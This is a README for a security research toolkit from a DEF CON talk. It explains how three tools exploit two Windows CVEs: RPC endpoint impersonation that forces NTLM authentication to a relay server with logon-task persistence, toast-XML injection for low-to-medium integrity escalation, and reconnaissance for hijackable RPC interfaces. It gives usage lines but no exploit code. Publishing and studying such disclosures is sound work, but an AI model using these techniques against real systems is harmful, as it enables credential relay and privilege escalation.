
# RPC-Racer
<div align="center">
<img src="./images/RPC-Racer.png" width="30%"/>
</div align="center">

StorSvc-Racer is used to exploit [CVE-2025-49760](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-49760).

This tool is used to masquerade as a legitimate, built-in RPC server of the operating system without administrator privileges.
It mimics the RPC interface of the Storage Service (StorSvc.dll) and forces the Delivery Optimization Service (dosvc.dll) to send an RPC request to it. The response sent by StorSvc-Racer contains a path that will be accessed by DoSvc. By specifying a network share as the path, an NTLM authentication of the machine account will be triggered. This authentication can then be relayed to leverage the privileges of the machine account.

This attack will succeed only if the Storage Service is turned off. To execute the tool before this service is launched, the parameter `/register` should be specified for StorSvc-Racer. It will make the tool create a scheduled task that will start when the current user logs on. After the machine reboots and the user logs on again, StorSvc-Racer will be executed automatically with the IP address specified upon registration.

Additional technical information is available on the [SafeBreach blog](https://www.safebreach.com/blog/you-snooze-you-lose-winning-rpc-endpoints/)

Presented at DEF CON 33 - [You snooze you lose: RPC-Racer winning RPC endpoints against services](https://www.youtube.com/watch?v=vBz8TBVxwk4)

## Usage
```
StorSvc-Racer.exe RELAY_SERVER_IP_ADDRESS [/register]
```

## Notes
- In cases where the Storage Service is launched before the scheduled task of StorSvc-Racer, the following setting should be turned on: Windows Update -> Advanced Options -> Delivery Optimization -> Allow downloads from other devices

# DsSvc-Racer
This tool is used to exploit [CVE-2025-59200](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-59200).

This tool is used to escalate privileges from low integrity to medium by mimicking the RPC interface of the Data Sharing Service (dssvc.dll). One of the clients of this RPC server is PerformanceTraceHandler.dll. This DLL file is loaded by taskhostw.exe when the scheduled task “RequestTrace” located in “\Microsoft\Windows\PerformanceTrace” is executed. 

This scheduled task is triggered by pressing Win+Shift+Control+T and it is executed as the logged on user. These keystrokes can be synthesizied from low integrity can calling the API SendInput.

This scheduled task is responsible for collecting a diagnostics trace. It launches two toasts. One notifies the user that a trace is being collected and the second one allows the user to send the trace via feedback hub. When the second toast is created, the following URI is used:
```
Feedback-Hub://?tabID=2&newFeedback=True&feedbackType=2&ContextId=67&files=
```
A string is appended to the end of this URI. This string is a token that is returned by the Data Sharing Service and it represents the zip file of the diagnostics. The complete URI is then used as a value for the arguments parameter in the following format string:
```XML
<toast scenario="systemDialog">
	<visual lang="en-US">
		<binding template="ToastGeneric">
			<text id="1">A trace has been successfully saved to %%LOCALAPPDATA%%\Traces.</text>
		</binding>
	</visual>
	<actions>
		<action id="1" activationType="Protocol" arguments="%ws" content="Launch Feedback Hub"/>
		<action id="2" activationType="Background" arguments="verbNotOk" content="Dismiss"/>
	</actions>
</toast>
```
DsSvc-Racer receives the call to DSCreateSharedFileToken therefore it can control what will be formatted into the XML. It injects text to control the actions that will happen when the user clicks the buttons. The buttons will launche a file of our choosing  as a medium integrity process.

## Usage
```
DsSvc-Racer.exe COMMAND
```

## Notes
- For the scheduled task “RequestTrace” to work, the following setting needs to be enabled: Privacy & security -> Diagnostics & feedback -> Send optional diagnostic data. This setting is enabled by default when installing Windows.

# RPC-Recon
This tool is used to find vulnerable interfaces that can be registered by an attacker right after the system boots, before most services are launched. It queries the Endpoint Mapper for all the dynamic endpoints registered and scans the memory of processes to find well-known endpoints. Then, it waits and performs the same retrieval again to find RPC servers that are registered late. When the RPC-Recon is done, a text file will be created with all interfaces that can be registered before the original service.

To create a scheduled task that will execute RPC-Recon when the current user logs on, specify the parameter `/register`.

## Usage
```
RPC-Recon.exe [/register]
```

## Notes
- RPC-Recon needs to read the memory of elevated processes. Therefore, it should be executed with administrator privileges.

## Credits
* [Ron Ben Yizhak](https://x.com/RonB_Y)

## References
* [RpcView](https://github.com/silverf0x/RpcView)
* [RpcDump](https://github.com/fortra/impacket/blob/master/examples/rpcdump.py)